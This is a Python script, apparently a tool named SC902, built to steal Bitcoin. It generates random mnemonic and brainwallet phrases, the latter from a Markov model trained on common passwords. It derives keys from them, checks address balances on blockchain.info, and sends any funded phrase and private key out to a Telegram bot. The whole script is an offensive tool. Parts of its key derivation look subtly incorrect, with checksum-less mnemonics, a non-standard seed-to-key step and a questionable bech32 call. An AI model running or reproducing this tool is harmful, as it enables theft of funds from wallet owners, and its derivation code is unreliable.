#!/usr/bin/env python3
import threading
import time
import secrets
import hashlib
import base58
import requests
import os
import bech32
import random
from mnemonic import Mnemonic
from ecdsa import SigningKey, SECP256k1
from config import TELEGRAM_TOKEN, TELEGRAM_CHAT, THREADS, DELAY
from wordlist import BIP39_WORDS

LOG_FILE = os.path.expanduser('~/.sc902/sweep.log')
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

def log(message):
    with open(LOG_FILE, 'a') as f:
        f.write(f"{time.ctime()}: {message}\n")
    print(message)

def send_alert(message):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT, "text": message},
            timeout=10
        )
        return True
    except Exception as e:
        log(f"Telegram Error: {str(e)}")
        return False

class MarkovBrainGen:
    def __init__(self):
        self.corpus = [
            '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon',
            '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', '696969', 'shadow', 'master', '666666',
            'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'pussy', 'superman', '1qaz2wsx', '7777777',
            'fuckyou', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm',
            'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou',
            'fuckme', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster',
            '112233', 'george', 'asshole', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555',
            '11111111', '131313', 'freedom', '777777', 'zaq1zaq1', 'pass', 'danielle', 'biteme', 'princess', 'flower',
            'guitar', 'cheese', 'foofoo', '6969', 'adobe123', '123123123', 'nicole', 'aaaaaa', 'tweety', '00000000',
            'golden', 'internet', '123454321', 'jackson', 'loveme', 'access', 'loveyou', 'welcome', 'monkey1', 'merlin',
            'qwerty123', 'admin', 'login', 'welcome1', 'password1', 'pass123', 'test', 'user', 'root', 'toor',
            'changeme', 'default', 'secret', 'private', 'public', 'hello', 'world', 'test123', 'admin123', 'user123',
            'passw0rd', 'p@ssw0rd', 'q1w2e3r4', 'a1b2c3', 'z1x2c3v4', 'iloveyou1', 'princess1', 'sunshine1', 'shadow1',
            'master1', 'dragon1', 'monkey1', 'football1', 'baseball1', 'superman1', 'batman1', 'harley1', 'tigger1',
            'andrew1', 'robert1', 'thomas1', 'george1', 'michelle1', 'jessica1', 'daniel1', 'jordan1', 'hunter1',
            'buster1', 'soccer1', 'hockey1', 'ranger1', 'charlie1', 'cheese1', 'guitar1', 'nicole1', 'danielle1'
        ] * 10
        
        self.markov = {}
        self.train()
    
    def train(self):
        for phrase in self.corpus:
            phrase = phrase.lower()
            for i in range(len(phrase)):
                prefix = phrase[max(0, i-2):i]
                suffix = phrase[i]
                if prefix not in self.markov:
                    self.markov[prefix] = []
                self.markov[prefix].append(suffix)
    
    def generate(self):
        length = random.randint(6, 12)
        prefixes = list(self.markov.keys())
        start_prefix = random.choice(prefixes)
        phrase = list(start_prefix)
        
        while len(phrase) < length:
            current_prefix = ''.join(phrase[-2:])
            if current_prefix in self.markov and self.markov[current_prefix]:
                next_char = random.choice(self.markov[current_prefix])
                phrase.append(next_char)
            else:
                phrase.append(random.choice('abcdefghijklmnopqrstuvwxyz0123456789'))
        
        base = ''.join(phrase)
        
        variants = [
            base,
            base.capitalize(),
            base.upper(),
            base + '1',
            base + '123',
            base + '!',
            base + '@',
            '1' + base,
            '!' + base,
            base.replace('a', '4').replace('e', '3').replace('o', '0'),
            base[::-1],
            base + '2025'
        ]
        
        return random.choice(variants)

def generate_mnemonic():
    length = 12 if secrets.randbelow(2) == 0 else 24
    return ' '.join(secrets.choice(BIP39_WORDS) for _ in range(length))

def phrase_to_wallet(phrase, is_mnemonic=True):
    try:
        if is_mnemonic:
            seed = Mnemonic.to_seed(phrase, passphrase="")
            privkey = hashlib.sha256(seed).digest()
        else:
            privkey = hashlib.sha256(phrase.encode()).digest()
        
        sk = SigningKey.from_string(privkey, curve=SECP256k1)
        
        pubkey = (b'\x02' if (sk.verifying_key.pubkey.point.y() % 2 == 0) else b'\x03') + sk.verifying_key.to_string()[:32]
        ripemd = hashlib.new('ripemd160', hashlib.sha256(pubkey).digest()).digest()
        
        p2pkh = base58.b58encode_check(b'\x00' + ripemd).decode()
        bech32_addr = bech32.encode('bc', 0, ripemd)
        
        return {
            'phrase': phrase,
            'privkey': privkey.hex(),
            'p2pkh': p2pkh,
            'bech32': bech32_addr
        }
    except Exception as e:
        log(f"Wallet Error: {str(e)}")
        return None

def check_balance(address):
    try:
        resp = requests.get(
            f"https://blockchain.info/balance?active={address}",
            headers={'User-Agent': 'Mozilla/5.0'},
            timeout=15
        )
        data = resp.json()
        return data.get(address, {}).get("final_balance", 0) / 1e8
    except Exception as e:
        return 0

def worker(brain_gen):
    while True:
        try:
            is_mnemonic = secrets.randbelow(2) == 0
            if is_mnemonic:
                phrase = generate_mnemonic()
            else:
                phrase = brain_gen.generate()
            
            wallet = phrase_to_wallet(phrase, is_mnemonic)
            if not wallet:
                continue
            
            bal1 = check_balance(wallet['p2pkh'])
            bal2 = check_balance(wallet['bech32'])
            total = bal1 + bal2
            
            ptype = "Mnemonic" if is_mnemonic else "Brain"
            
            if total > 0:
                msg = f"💰 FOUND {total} BTC!\n\n"
                msg += f"Phrase: {wallet['phrase']} ({ptype})\n"
                if bal1 > 0:
                    msg += f"Legacy: {wallet['p2pkh']} ({bal1} BTC)\n"
                if bal2 > 0:
                    msg += f"Bech32: {wallet['bech32']} ({bal2} BTC)\n"
                msg += f"\nPrivate: {wallet['privkey']}"
                
                if send_alert(msg):
                    log(f"💰 Found: {total} BTC - {wallet['p2pkh']} ({ptype})")
                else:
                    log("⚠ Found but Telegram failed")
            else:
                log(f"Checked: {wallet['p2pkh']} (0) ({ptype})")
                
        except Exception as e:
            log(f"Error: {str(e)}")
        finally:
            time.sleep(DELAY)

if __name__ == "__main__":
    brain_gen = MarkovBrainGen()
    log("🚀 SC902 Started - Made by SSI902 😎")
    for _ in range(THREADS):
        threading.Thread(target=worker, args=(brain_gen,), daemon=True).start()
    
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        log("🛑 Stopped by user")
